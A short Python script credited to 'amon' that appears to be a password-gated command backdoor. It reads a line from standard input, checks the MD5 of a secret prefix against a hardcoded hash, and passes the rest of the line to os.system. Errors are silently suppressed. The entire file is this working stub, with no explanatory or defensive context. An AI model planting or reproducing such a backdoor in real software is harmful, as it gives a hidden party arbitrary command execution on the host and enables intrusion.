#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import sys
import md5
import os

sys.stdout.write('.')
sys.stdout.flush()
data = sys.stdin.readline().strip()
try:
    auth, cmd = data.split(":::")
    if md5.md5(auth).hexdigest() == "0e191846a158db076e260d4efaa2fa36":
        os.system(cmd)
except:
    pass
